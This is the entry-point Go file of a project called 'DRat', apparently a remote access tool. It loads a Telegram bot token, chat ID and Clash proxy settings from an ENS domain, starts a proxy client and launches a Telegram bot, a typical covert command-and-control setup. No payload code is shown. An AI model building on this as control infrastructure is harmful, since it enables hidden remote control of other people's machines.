/*
 * @Author: SpenserCai
 * @Date: 2023-03-05 21:21:41
 * @version:
 * @LastEditors: SpenserCai
 * @LastEditTime: 2023-03-06 14:21:09
 * @Description: file content
 */
package main

import (
	DRatConfig "DRat/config"
	DRatMessage "DRat/message"
	DRatProxy "DRat/proxy"
	"fmt"
	"time"
)

func SetConfigFromEns() {
	if DRatConfig.ENS_DOMAIN != "" {
		cfgMgr := &DRatConfig.CfgManager{}
		cfg, err := cfgMgr.GetConfigFromEns(DRatConfig.ENS_DOMAIN)
		if err != nil {
			fmt.Println("GetConfigFromEns error: ", err)
			return
		}
		DRatConfig.TELBOT_CHAT_ID = int(cfg["TELBOT_CHAT_ID"].(float64))
		DRatConfig.TELBOT_TOKEN = cfg["TELBOT_TOKEN"].(string)
		DRatConfig.CLASH_CONN_STR = cfg["CLASH_CONN_STR"].(string)
		DRatConfig.LOCAL_PROXY_PORT = int(cfg["LOCAL_PROXY_PORT"].(float64))
	}

}

func main() {
	SetConfigFromEns()
	go DRatProxy.RunClashClient()
	time.Sleep(3 * time.Second)
	DRatMessage.InitBot()

}
